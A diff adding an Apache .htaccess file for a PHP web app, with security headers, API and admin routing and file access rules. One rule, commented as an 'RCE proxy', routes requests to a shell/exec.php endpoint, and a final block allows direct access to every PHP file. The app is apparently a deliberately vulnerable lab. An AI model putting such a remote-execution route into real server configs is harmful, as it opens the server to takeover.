@@ -1,0 +1,37 @@
+RewriteEngine On
+
+# Security headers
+Header always set X-Content-Type-Options nosniff
+Header always set X-Frame-Options DENY
+Header always set X-XSS-Protection "1; mode=block"
+
+# API endpoint routing
+RewriteRule ^api/upload/?$ api/upload.php [L,QSA]
+RewriteRule ^api/docs/?$ api/docs.php [L,QSA]
+
+# Shell endpoint routing (for RCE proxy)
+RewriteRule ^shell/exec/?$ shell/exec.php [L,QSA]
+
+# Admin panel routing
+RewriteRule ^admin/?$ admin.php [L,QSA]
+RewriteRule ^logout/?$ logout.php [L,QSA]
+
+# Default routing to index.php
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ index.php [L,QSA]
+
+# Deny access to sensitive files
+<Files "*.log">
+    Deny from all
+</Files>
+
+<Files "security_logger.php">
+    Deny from all
+</Files>
+
+# Allow API and shell endpoints to be accessed directly
+<FilesMatch "\.(php)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
